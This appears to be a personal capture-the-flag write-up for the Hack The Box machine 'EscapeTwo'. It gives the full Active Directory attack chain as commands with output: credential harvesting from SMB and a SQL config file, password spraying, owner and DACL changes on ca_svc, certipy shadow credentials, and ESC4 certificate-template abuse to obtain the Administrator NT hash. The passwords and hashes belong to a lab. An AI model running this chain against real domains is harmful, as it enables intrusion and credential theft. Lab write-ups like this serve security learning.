Escape Two

we have creds. There is files in the smb.
excel unreadable. it's zip archive. In one of them they are creds.
Some are valid, you can get the Oscar user. But nothing much more.
Oscar can connect to mssql but can't execute commands.

SA can connect to the mssql and execute command. We use revshells.com to get one in b64.

Then, in `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` there is the creds for sql_svc.

USER=sql_svc
PASSWORD=WqSZAF6CysDQbGb3

Then password spraying, it seems like the admin, ryan used the same password.

USER=ryan
PASSWORD=WqSZAF6CysDQbGb3

We now use bloodhound. Ryan have "WriteOwner" over ca_svc.

If we try shadow-credentials, we have

```bash
certipy shadow auto -username "$USER"@"$DOMAIN" -p "$PASSWORD" -account ca_svc

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9f593ed3-111d-9676-95c7-16fc2d05e990'
[*] Adding Key Credential with device ID '9f593ed3-111d-9676-95c7-16fc2d05e990' to the Key Credentials for 'ca_svc'
[-] Could not update Key Credentials for 'ca_svc' due to insufficient access rights: 00002098: SecErr: DSID-031514A0, problem 4003 (INSUFF_ACCESS_RIGHTS), data 0
```

As we have WriteOwner, we might need to change the owner of ca_svc. Let's do it using bloodyAD

```bash
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner ca_svc "$USER"
```

We tried certipy, but did not work. Let's check the attributes with ldapsearch :

```bash
ldapsearch -x -H ldap://"$DC_HOST" -D "$USER"@"$DOMAIN" -w "$PASSWORD" -b "CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB" owner
```

There is no attribue owner or so.

Let's try an other tool :

```bash
owneredit.py -action write -owner "$USER" -target ca_svc "$DOMAIN"/"$USER":"$PASSWORD"
```

Did not work either when using certipy. However :

```bash
[Jan 15, 2025 - 15:42:37 (UTC)] exegol-CTF-AD EscapeTwo # owneredit.py -action write -new-owner "$USER" -target ca_svc "$DOMAIN"/"$USER":"$PASSWORD"
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

Owner is Domain Admins. It hasn't changed. We want to modify that !

```bash
[Jan 15, 2025 - 15:43:09 (UTC)] exegol-CTF-AD EscapeTwo # owneredit.py -action write -new-owner ryan -target ca_svc "$DOMAIN"/"$USER":"$PASSWORD"
Impacket v0.13.0.dev0+20240918.213844.ac790f2b - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-548670397-972687484-3496335370-1114
[*] - sAMAccountName: ryan
[*] - distinguishedName: CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
[*] OwnerSid modified successfully!
```

Now owner is ryan ! It seems that the "$USER" was not working.

```bash
[Jan 15, 2025 - 15:44:08 (UTC)] exegol-CTF-AD EscapeTwo # echo $USER $PASSWORD $TARGET $DC_HOST $DC_IP $DOMAIN
ryan WqSZAF6CysDQbGb3 10.10.11.51 DC01.sequel.htb 10.10.11.51 sequel.htb
```

But it was set.... very strange.

We now need to authorize Ryan to modify the attributes :

```bash
dacledit.py -action 'write' -principal "$USER" -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' "$DOMAIN"/"$USER":"$PASSWORD"
```

Now we can shadow credentials

```bash
[Jan 15, 2025 - 15:44:15 (UTC)] exegol-CTF-AD EscapeTwo # certipy shadow auto -username "$USER"@"$DOMAIN" -p "$PASSWORD" -account ca_svc

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b59f18ed-bc73-4bf6-7698-b3ab0f695934'
[*] Adding Key Credential with device ID 'b59f18ed-bc73-4bf6-7698-b3ab0f695934' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID 'b59f18ed-bc73-4bf6-7698-b3ab0f695934' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

We have the hash ! Now we can try certipy attacks. Indeed, ca_svc is a member of "certs publishers"

USER=ca_svc
HASH=3b181b914e7a9d5508ea1e20bc2b7fce

```bash
certipy find -u "$USER"@"$DOMAIN" -hashes "$HASH" -dc-ip "$DC_IP" -vulnerable -stdout

[!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

And boom ! let's check this on the hacker recipe. In short, it allows you to manipulate the default template, and upload one from which you can now use vuln ESC1, ESC2 or ESC3

1. Request the old certificate

```bash
certipy template -u "$USER@$DOMAIN" -hashes "$HASH" -dc-ip "$DC_IP" -template DunderMifflinAuthentication -save-old
```

2. Request a template certificate with a custom upn. Warning ! Don't forget to use the ca_name find with certipy. It's not the service account name.

```bash
certipy req -u "$USER@$DOMAIN" -hashes "$HASH" -dc-ip "$DC_IP" -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn administrator@"$DOMAIN" -dns "$DC_HOST"
```

After a few, try, I was missing the `-dns`.

Then get the hash using the certificate

```bash
certipy auth -pfx ./administrator_dc01.pfx -dc-ip "$DC_IP"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'administrator@sequel.htb'
    [1] DNS Host Name: 'DC01.sequel.htb'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

Did not get winrm to work, so I used wmiexec instead.

Fun box. Always
